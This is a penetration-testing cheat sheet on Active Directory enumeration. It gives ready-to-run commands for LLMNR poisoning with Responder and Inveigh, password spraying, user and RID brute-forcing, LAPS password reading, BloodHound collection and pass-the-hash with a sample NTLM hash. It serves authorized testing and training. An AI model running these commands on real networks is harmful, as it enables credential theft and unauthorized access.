# Active Directory - Enumeration

## Credential Hunting

Finding something from nothing

* [Kerbrute](https://github.com/ropnop/kerbrute.git)
  ```bash
  kerbrute userenum -d 'domain' --dc 0.0.0.0 <wordlist> -o <outfile>
  ```
* Responder
  ```bash
  # Default Settings
  sudo responder -I <iface>
  
  # Provides NTLMv2 Hashes. Cannot be used for PTH and must be cracked
  hashcat -a 0 -m 5600 <hashfile> <wordlist>
  ```
* [Inveigh](https://github.com/Kevin-Robertson/Inveigh) - No longer Updated
  ```ps1
  Import-Module .\Inveigh.ps1
  
  #LLMNR/NBT-NS Poisoning
  Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
  ```
* [InveighZero](https://github.com/Kevin-Robertson/Inveigh) - C# Version, Currently Updated
  ```ps1
  # Default Run
  .\Inveigh.exe

  # Press [esc] to enter the console
  Get NTLMV@UNIQUE # View Hashes
  Get NTLMV2USERNAMES # View Usernames
  ```

Making a list, checking it twice

* enum4linux
  ```bash
  enum4linux -U <IP> | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
  ```
* rpcclient
  ```bash
  # Will require manually fixing the list
  rpcclient -U "" -N <IP>
  enumdomusers
  ```
* crackmapexec
  ```bash
  # Will require manually fixing the list
  crackmapexec smb <IP> --users
  ```
* ldapsearch
  ```bash
  ldapsearch -h <IP> -x -b "DC=test,DC=local" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
  ```
* crackmapexe w/ Credentials
  ```bash
  sudo crackmapexec smb <IP> -u <username> -p <password> --users
  ```

Spray and Pray
> Password spraying is very loud and very likely to be detected by a blue team
* Bash one-liner
  ```bash
  for u in $(cat <userlist>);do rpcclient -U "<password-to-test" -c "getusername;quit" <IP> | grep Authority; done
  ```
* Kerbrute
  ```bash
  kerbrute passwordspray -d <domain> --dc <IP> <userlist.txt> <Password_to_test>
  ```
* crackmapexec
  ```bash
  crackmapexec smb <IP> -u <userlist.txt> -p <Password_to_test> | grep +
  ```
> Consider local admin password reuse, and spray a local admin username and password across the network if you find it.
> > Even spray local admin hashes if you find them
* crackmapexec
  ```bash
  sudo crackmapexec smb --local-auth <IP>/<cidr> -u administrator -H <hash> | grep +
  ```
* [DomainPasswordSpray.ps1](https://github.com/dafthack/DomainPasswordSpray) (Spraying from Windows)
  ```ps1
  Import-Module .\DomainPasswordSpray.ps1
  Invoke-DomainPasswordSpray -Password <password> -OutFile <outfile> -ErrorAction SilentlyContinue
  ```

## User Hunting

Sometimes you need to find a machine where a specific user is logged in.
You can remotely query every machines on the network to get a list of the users's sessions.

* netexec

  ```ps1
  nxc smb 10.10.10.0/24 -u Administrator -p 'P@ssw0rd' --sessions
  SMB         10.10.10.10    445    WIN-8OJFTLMU1IG  [+] Enumerated sessions
  SMB         10.10.10.10    445    WIN-8OJFTLMU1IG  \\10.10.10.10            User:Administrator
  ```

* Impacket Smbclient

  ```ps1
  $ impacket-smbclient Administrator@10.10.10.10
  # who
  host:  \\10.10.10.10, user: Administrator, active:     1, idle:     0
  ```

* PowerView Invoke-UserHunter

  ```ps1
  # Find computers were a Domain Admin OR a specified user has a session
  Invoke-UserHunter
  Invoke-UserHunter -GroupName "RDPUsers"
  Invoke-UserHunter -Stealth
  ```

## RID cycling

In Windows, every security principal (user, group, etc.) has a Security Identifier (SID). The SID is a unique identifier used for access control.

```ps1
S-1-5-21-<domain>-<RID>
```

* `S-1-5-21-<domain>` = Base domain SID
* `<RID>` = Unique ID assigned to a user/group

RID cycling involves brute-forcing a range of RIDs (like 500–1500) by appending them to the known domain SID, and attempting to resolve each SID into a username.

* Using [Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)

  ```ps1
  netexec smb 10.10.11.231 -u guest -p '' --rid-brute 10000 --log rid-brute.txt
  SMB         10.10.11.231    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
  SMB         10.10.11.231    445    DC01             [+] rebound.htb\guest:
  SMB         10.10.11.231    445    DC01             498: rebound\Enterprise Read-only Domain Controllers (SidTypeGroup)
  SMB         10.10.11.231    445    DC01             500: rebound\Administrator (SidTypeUser)
  SMB         10.10.11.231    445    DC01             501: rebound\Guest (SidTypeUser)
  SMB         10.10.11.231    445    DC01             502: rebound\krbtgt (SidTypeUser)
  ```

* Using Impacket script [impacket/lookupsid.py](https://github.com/fortra/impacket/blob/master/examples/lookupsid.py)

  ```ps1
  lookupsid.py -no-pass 'guest@rebound.htb' 20000
  ```

## Enumerating Security Controls
> Now that we have a foothold, it's time to figure out what we're allowed to do/run

* **Windows Defender**
    ```powershell
    Get-MPComputerStatus
    ```
* **AppLocker**
    ```powershell
    Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
    ```
* **PowerShell Constrained Language Mode**
    ```powershell
    $ExecutionContext.SessionState.LanguageMode
    ```
* **LAPS**  
    Used to randomize and rotate local administrator credentials to prevent lateral movement
    We can use [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) functions to speed this up  
    
    ```powershell
    Find-LAPSDelegatedGroups
    ```
    ```powershell
    # Check the rights on each computer with LAPS Enabled for any groups with read access and users with "All Extended Rights"
    # Users with "All Extended Rights" can read LAPS passwords and may be less protected than users in delegated groups
    Find-AdmPwdExtendedRights
    ```
    ```powershell
    # If the current user has access, we can search for computers with LAPS enabled, and get the passwords
    Get-LAPSComputers
    ```

## Credentialed Enumeration
> "That fuckin' nobody, was ..."

### Using BloodHound

Use the appropriate data collector to gather information for **BloodHound** or **BloodHound Community Edition (CE)** across various platforms.

* [BloodHoundAD/AzureHound](https://github.com/BloodHoundAD/AzureHound) for Azure Active Directory
* [BloodHoundAD/SharpHound](https://github.com/BloodHoundAD/SharpHound) for local Active Directory (C# collector)
* [FalconForceTeam/SOAPHound](https://github.com/FalconForceTeam/SOAPHound) for local Active Directory (C# collector using ADWS)
* [g0h4n/RustHound-CE](https://github.com/g0h4n/RustHound-CE) for local Active Directory (Rust collector)
* [NH-RED-TEAM/RustHound](https://github.com/NH-RED-TEAM/RustHound) for local Active Directory (Rust collector)
* [fox-it/BloodHound.py](https://github.com/fox-it/BloodHound.py) for local Active Directory (Python collector)
* [coffeegist/bofhound](https://github.com/coffeegist/bofhound) for local Active Directory  (Generate BloodHound compatible JSON from logs written by ldapsearch BOF, pyldapsearch and Brute Ratel's LDAP Sentinel)
* [c3c/ADExplorerSnapshot.py](https://github.com/c3c/ADExplorerSnapshot.py) - for local Active Directory (Generate BloodHound compatible JSON from AD Explorer snapshot)
* [CrowdStrike/sccmhound](https://github.com/CrowdStrike/sccmhound) for local Active Directory (C# collector using Microsoft Configuration Manager)

**Examples**:

* Use [BloodHoundAD/AzureHound](https://github.com/BloodHoundAD/AzureHound) (more info: [Cloud - Azure Pentest](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest.md#azure-recon-tools))

* Use [BloodHoundAD/SharpHound.exe](https://github.com/BloodHoundAD/BloodHound) - run the collector on the machine using SharpHound.exe

  ```powershell
  .\SharpHound.exe -c all -d active.htb --searchforest
  .\SharpHound.exe -c all,GPOLocalGroup # all collection doesn't include GPOLocalGroup by default
  .\SharpHound.exe --CollectionMethod DCOnly # only collect from the DC, doesn't query the computers (more stealthy)

  .\SharpHound.exe -c all --LdapUsername <UserName> --LdapPassword <Password> --JSONFolder <PathToFile>
  .\SharpHound.exe -c all --LdapUsername <UserName> --LdapPassword <Password> --domaincontroller 10.10.10.100 -d active.htb

  .\SharpHound.exe -c All,GPOLocalGroup --outputdirectory C:\Windows\Temp --prettyprint --randomfilenames --collectallproperties --throttle 10000 --jitter 23  --outputprefix internalallthething
  ```

* Use [BloodHoundAD/SharpHound.ps1](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1) - run the collector on the machine using Powershell

  ```powershell
  Invoke-BloodHound -SearchForest -CSVFolder C:\Users\Public
  Invoke-BloodHound -CollectionMethod All  -LDAPUser <UserName> -LDAPPass <Password> -OutputDirectory <PathToFile>
  ```

* Use [ly4k/Certipy](https://github.com/ly4k/Certipy) to collect certificates data

  ```ps1
  certipy find 'corp.local/john:Passw0rd@dc.corp.local' -bloodhound
  certipy find 'corp.local/john:Passw0rd@dc.corp.local' -old-bloodhound
  certipy find 'corp.local/john:Passw0rd@dc.corp.local' -vulnerable -hide-admins -username user@domain -password Password123
  ```

* Use [NH-RED-TEAM/RustHound](https://github.com/OPENCYBER-FR/RustHound)

  ```ps1
  # Windows with GSSAPI session
  rusthound.exe -d domain.local --ldapfqdn domain
  # Windows/Linux simple bind connection username:password
  rusthound.exe -d domain.local -u user@domain.local -p Password123 -o output -z
  # Linux with username:password and ADCS module for @ly4k BloodHound version
  rusthound -d domain.local -u 'user@domain.local' -p 'Password123' -o /tmp/adcs --adcs -z
  ```

* Use [FalconForceTeam/SOAPHound](https://github.com/FalconForceTeam/SOAPHound)

  ```ps1
  --buildcache: Only build cache and not perform further actions
  --bhdump: Dump BloodHound data
  --certdump: Dump AD Certificate Services (ADCS) data
  --dnsdump: Dump AD Integrated DNS data

  SOAPHound.exe --buildcache -c c:\temp\cache.txt
  SOAPHound.exe -c c:\temp\cache.txt --bhdump -o c:\temp\bloodhound-output
  SOAPHound.exe -c c:\temp\cache.txt --bhdump -o c:\temp\bloodhound-output --autosplit --threshold 1000
  SOAPHound.exe -c c:\temp\cache.txt --certdump -o c:\temp\bloodhound-output
  SOAPHound.exe --dnsdump -o c:\temp\dns-output
  ```

* Use [fox-it/BloodHound.py](https://github.com/fox-it/BloodHound.py)

  ```bash
  pip install bloodhound
  bloodhound-python -d domain.local -u username -p password -gc "GC Hostname" -dc "<DC Hostname>" -ns <DNS IP> -c all --zip
  # With Kerberos
  bloodhound-python -d "scepter.htb" -u "d.baker" -no-pass -k -gc "dc01.scepter.htb" -dc "dc01.scepter.htb" -ns 10.10.11.65 -c all --zip
  ```

* Use [c3c/ADExplorerSnapshot.py](https://github.com/c3c/ADExplorerSnapshot.py) to query data from SysInternals/ADExplorer snapshot  (ADExplorer remains a legitimate binary signed by Microsoft, avoiding detection with security solutions).

  ```py
  ADExplorerSnapshot.py <snapshot path> -o <*.json output folder path>
  ```

Then import the zip/json files into the Neo4J database and query them.

```powershell
root@payload$ apt install bloodhound 

# start BloodHound and the database
root@payload$ neo4j console
# or use docker
root@payload$ docker run -itd -p 7687:7687 -p 7474:7474 --env NEO4J_AUTH=neo4j/bloodhound -v $(pwd)/neo4j:/data neo4j:4.4-community

root@payload$ ./bloodhound --no-sandbox
Go to http://127.0.0.1:7474, use db:bolt://localhost:7687, user:neo4J, pass:neo4j
```

NOTE: Currently BloodHound Community Edition is still a work in progress, it is highly recommended to stay on the original [BloodHoundAD/BloodHound](https://github.com/BloodHoundAD/BloodHound/) version.

```ps1
git clone https://github.com/SpecterOps/BloodHound
cd examples/docker-compose/
cat docker-compose.yml | docker compose -f - up
# UI: http://localhost:8080/ui/login
# Username: admin
# Password: see your Docker logs
```

You can add some custom queries like :

* [Bloodhound-Custom-Queries from @hausec](https://github.com/hausec/Bloodhound-Custom-Queries/blob/master/customqueries.json)
* [BloodHoundQueries from CompassSecurity](https://github.com/CompassSecurity/BloodHoundQueries/blob/master/customqueries.json)
* [BloodHound Custom Queries from Exegol - @ShutdownRepo](https://raw.githubusercontent.com/ThePorgs/Exegol-images/main/sources/assets/bloodhound/customqueries.json)
* [Certipy BloodHound Custom Queries from ly4k](https://github.com/ly4k/Certipy/blob/main/customqueries.json)

Replace the customqueries.json file located at `/home/username/.config/bloodhound/customqueries.json` or `C:\Users\USERNAME\AppData\Roaming\BloodHound\customqueries.json`.

## Credentialed Enumeration From Linux
### Using crackmapexec
* **User Enumeration**  
  ```bash
  sudo crackmapexe smb <IP> -u <username> -p <password> --users
  ```
* **Group Enumeration**  
  ```bash
  sudo crackmapexe smb <IP> -u <username> -p <password> --groups
  ```
* **Logged on Users**  
  ```bash
  sudo crackmapexe smb <IP> -u <username> -p <password> --loggedon-users
  ```
* **Shares**  
  ```bash
  sudo crackmapexe smb <IP> -u <username> -p <password> --shares
  ```
* **List all readable files in all readable shares**  
  ```bash
  sudo crackmapexe smb <IP> -u <username> -p <password> -M spider_plus --share '<share name>'
  # Results
  head -n 10 /tmp/cme_spider_plus/<IP>.json
  ```
### Using smbmap
* **Share Enumeration**  
  ```bash
  # List all shares and our permissions
  smbmap -u <username> -p <password> -d <domain> -H <IP>
  ```
* **Recursive list all directories**  
  ```bash
  # Remove --dir-only to list files as well
  smbmap -u <username> -p <password> -d <domain> -H <IP> -R '<share name>' --dir-only
  ```
### Using rpcclient
* **Testing for Null Shares**
  ```bash
  rpcclient -U "" -N <IP>
  ```
* **Query Domain Users**  
  ```bash
  enumdomusers
  ```
* **Password Policy**
  ```bash
  querydominfo
  ```
* **User Details**  
  ```bash
  queryuser 0x<RID>
  ```
### Using Impacket's Psexec.py
> Requires a user with local admin priv  
* **Connecting** 
  ```bash
  # Username/Password
  impacket-psexec <domain>/<username:'<password>@<IP>'
  # With Hash
  impacket-psexec administrator@10.10.11.51 -hashes aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
  ```
### Using wmiexec.py
> Executes commands via WMI (This shell will not be fully interactive)
* **Connecting**  
  ```bash
  wmiexec.py <domain>/<username>:<password>@<IP>
  ```
### Using [Windapsearch](https://github.com/ropnop/windapsearch)
> Uses LDAP query's. Does not provide a shell
* **Find Domain Admins**  
  ```bash
  python3 windapsearch.py --dc-ip <DC IP> -u <username>@<domain> -p <password> --da
  ```
* **Privileged Users**  
  ```bash
  python3 windapsearch.py --dc-ip <DC IP> -u <username>@<domain> -p <password> --PU
  ```
### misc
* **Password Policy**
  ```bash
  # CME
  crackmapexec smb <IP> -u <username> -p <password> --pass-pol
  # rpcclient
  querydominfo
  # enum4linux
  enum4linux -P <IP>
  # enum4linux-ng (Written in Python, supports colored output and export to JSON or YAML)
  enum4linux-ng -P <IP> -oA <outfile>
  #LDAP Anonymous Bind
  ldapsearch -h <host ip> -x -b "DC=test,DC=local" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
  ```

## Credentialed Enumeration From Windows
### AD Powershell
* **Discover Modules**  
  ```powershell
  Get-Module
  ```
* **Load AD Module**
  ```powershell
  Import-Module ActiveDirectory
  ```
* **Basic Domain Info**  
  ```powershell
  Get-ADDomain
  ```
* **AD Accounts with SPN**  
  ```powershell
  Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
  ```
* **Checking for Trust Relationships**  
  ```powershell
  Get-ADTrust -Filter *
  ```
* **Group Enumeration**  
  ```powershell
  Get-ADGroup -Filter * | select name
  ```
* **Detailed Group Enumeration**
  ```powershell
  Get-ADGroup -identity "<Group Name>"
  ```
* **Group Membership**  
  ```powershell
  Get-ADGroupMember -Identity "<Group Name>"
  ```
* **Testing for Null Shares**

* **Password Policy**
  ```cmd
  net accounts
  ```

### Using PowerView
  
* **Get Current Domain:** `Get-NetDomain`
* **Enum Other Domains:** `Get-NetDomain -Domain <DomainName>`
* **Get Domain SID:** `Get-DomainSID`
* **Get Domain Policy:**

  ```powershell
  Get-DomainPolicy

  #Will show us the policy configurations of the Domain about system access or kerberos
  (Get-DomainPolicy)."system access"
  (Get-DomainPolicy)."kerberos policy"
  ```

* **Get Domain Controllers:**

  ```powershell
  Get-NetDomainController
  Get-NetDomainController -Domain <DomainName>
  ```

* **Enumerate Domain Users:**

  ```powershell
  Get-NetUser
  Get-NetUser -SamAccountName <user> 
  Get-NetUser | select cn
  Get-UserProperty
  
  #Get specific information about a user
  Get-Domainuser -Identity <username> -Domain <domain> | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol

  #Check last password change
  Get-UserProperty -Properties pwdlastset

  #Get a specific "string" on a user's attribute
  Find-UserField -SearchField Description -SearchTerm "wtver"
  
  #Enumerate user logged on a machine
  Get-NetLoggedon -ComputerName <ComputerName>
  
  #Enumerate Session Information for a machine
  Get-NetSession -ComputerName <ComputerName>
  
  #Enumerate domain machines of the current/specified domain where specific users are logged into
  Find-DomainUserLocation -Domain <DomainName> | Select-Object UserName, SessionFromName
  ```

* **Enum Domain Computers:**

  ```powershell
  Get-NetComputer -FullData
  Get-DomainGroup

  #Enumerate Live machines 
  Get-NetComputer -Ping
  ```

* **Enum Groups and Group Members:**

  ```powershell
  Get-NetGroupMember -GroupName "<GroupName>" -Domain <DomainName>
  
  #Enumerate the members of a specified group of the domain
  Get-DomainGroup -Identity <GroupName> | Select-Object -ExpandProperty Member
  
  #Enumerate the members of the group and any nested groups
  Get-DomainGroupMember -Identity "<Group Name>" -Recurse
  
  #Returns all GPOs in a domain that modify local group memberships through Restricted Groups or Group Policy Preferences
  Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName
  ```

* **Enumerate Shares**

  ```powershell
  #Enumerate Domain Shares
  Find-DomainShare
  
  #Enumerate Domain Shares the current user has access
  Find-DomainShare -CheckShareAccess
  ```

* **Enum Group Policies:**

  ```powershell
  Get-NetGPO

  # Shows active Policy on specified machine
  Get-NetGPO -ComputerName <Name of the PC>
  Get-NetGPOGroup

  #Get users that are part of a Machine's local Admin group
  Find-GPOComputerAdmin -ComputerName <ComputerName>
  ```

* **Enum OUs:**

  ```powershell
  Get-NetOU -FullData 
  Get-NetGPO -GPOname <The GUID of the GPO>
  ```

* **Enum ACLs:**

  ```powershell
  # Returns the ACLs associated with the specified account
  Get-ObjectAcl -SamAccountName <AccountName> -ResolveGUIDs
  Get-ObjectAcl -ADSprefix 'CN=Administrator, CN=Users' -Verbose

  #Search for interesting ACEs
  Invoke-ACLScanner -ResolveGUIDs

  #Check the ACLs associated with a specified path (e.g smb share)
  Get-PathAcl -Path "\\Path\Of\A\Share"
  ```

* **Enum Domain Trust:**

  ```powershell
  Get-NetDomainTrust
  Get-NetDomainTrust -Domain <DomainName>
  Get-DomainTrustMapping
  ```

* **Enum Forest Trust:**

  ```powershell
  Get-NetForestDomain
  Get-NetForestDomain Forest <ForestName>

  #Domains of Forest Enumeration
  Get-NetForestDomain
  Get-NetForestDomain Forest <ForestName>

  #Map the Trust of the Forest
  Get-NetForestTrust
  Get-NetDomainTrust -Forest <ForestName>
  ```

* **User Hunting:**

  ```powershell
  #Finds all machines on the current domain where the current user has local admin access
  Find-LocalAdminAccess -Verbose

  #Find local admins on all machines of the domain:
  Invoke-EnumerateLocalAdmin -Verbose

  #Find computers were a Domain Admin OR a specified user has a session
  Invoke-UserHunter
  Invoke-UserHunter -GroupName "RDPUsers"
  Invoke-UserHunter -Stealth

  #Confirming admin access:
  Invoke-UserHunter -CheckAccess
  ```
* **Test for local admin access**  
  ```powershell
  Test-AdminAccess -ComputerName <computer name>
  ```
### Using AD Module
* **See what Modules are loaded** ```powershell Get-Module```
* **Get Current Domain:** `Get-ADDomain`
* **Enum Other Domains:** `Get-ADDomain -Identity <Domain>`
* **Get Domain SID:** `Get-DomainSID`
* **Get Domain Controlers:**

  ```powershell
  Get-ADDomainController
  Get-ADDomainController -Identity <DomainName>
  ```
  
* **Enumerate Domain Users:**

  ```powershell
  Get-ADUser -Filter * -Identity <user> -Properties *

  #Get a specific "string" on a user's attribute
  Get-ADUser -Filter 'Description -like "*wtver*"' -Properties Description | select Name, Description
  #Get all users with a SPN set
  Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
  ```

* **Enum Domain Computers:**

  ```powershell
  Get-ADComputer -Filter * -Properties *
  Get-ADGroup -Filter * 
  ```

* **Enum Domain Trust:**

  ```powershell
  Get-ADTrust -Filter *
  Get-ADTrust -Identity <DomainName>
  ```

* **Enum Forest Trust:**

  ```powershell
  Get-ADForest
  Get-ADForest -Identity <ForestName>

  #Domains of Forest Enumeration
  (Get-ADForest).Domains
  ```

* **Enum Local AppLocker Effective Policy:**

 ```powershell
 Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 ```

## Other Interesting Commands

* **Find Domain Controllers**

  ```ps1
  nslookup domain.com
  nslookup -type=srv _ldap._tcp.dc._msdcs.<domain>.com
  nltest /dclist:domain.com
  Get-ADDomainController -filter * | Select-Object name
  gpresult /r
  $Env:LOGONSERVER 
  echo %LOGONSERVER%
  ```

## References

* [Explain like I’m 5: Kerberos - Apr 2, 2013 - @roguelynn](https://www.roguelynn.com/words/explain-like-im-5-kerberos/)
* [Pen Testing Active Directory Environments - Part I: Introduction to netexec (and PowerView)](https://blog.varonis.com/pen-testing-active-directory-environments-part-introduction-netexec-powerview/)
* [Pen Testing Active Directory Environments - Part II: Getting Stuff Done With PowerView](https://blog.varonis.com/pen-testing-active-directory-environments-part-ii-getting-stuff-done-with-powerview/)
* [Pen Testing Active Directory Environments - Part III:  Chasing Power Users](https://blog.varonis.com/pen-testing-active-directory-environments-part-iii-chasing-power-users/)
* [Pen Testing Active Directory Environments - Part IV: Graph Fun](https://blog.varonis.com/pen-testing-active-directory-environments-part-iv-graph-fun/)
* [Pen Testing Active Directory Environments - Part V: Admins and Graphs](https://blog.varonis.com/pen-testing-active-directory-v-admins-graphs/)
* [Pen Testing Active Directory Environments - Part VI: The Final Case](https://blog.varonis.com/pen-testing-active-directory-part-vi-final-case/)
* [Attacking Active Directory: 0 to 0.9 - Eloy Pérez González - 2021/05/29](https://zer1t0.gitlab.io/posts/attacking_ad/)
* [Fun with LDAP, Kerberos (and MSRPC) in AD Environments](https://speakerdeck.com/ropnop/fun-with-ldap-kerberos-and-msrpc-in-ad-environments)
* [Penetration Testing Active Directory, Part I - March 5, 2019 - Hausec](https://hausec.com/2019/03/05/penetration-testing-active-directory-part-i/)
* [Penetration Testing Active Directory, Part II - March 12, 2019 - Hausec](https://hausec.com/2019/03/12/penetration-testing-active-directory-part-ii/)
* [Using bloodhound to map the user network - Hausec](https://hausec.com/2017/10/26/using-bloodhound-to-map-the-user-network/)
* [PowerView 3.0 Tricks - HarmJ0y](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
* [SOAPHound - tool to collect Active Directory data via ADWS - Nikos Karouzos - 01/26/204](https://medium.com/falconforce/soaphound-tool-to-collect-active-directory-data-via-adws-165aca78288c)
* [Training - Attacking and Defending Active Directory Lab - Altered Security](https://www.alteredsecurity.com/adlab)
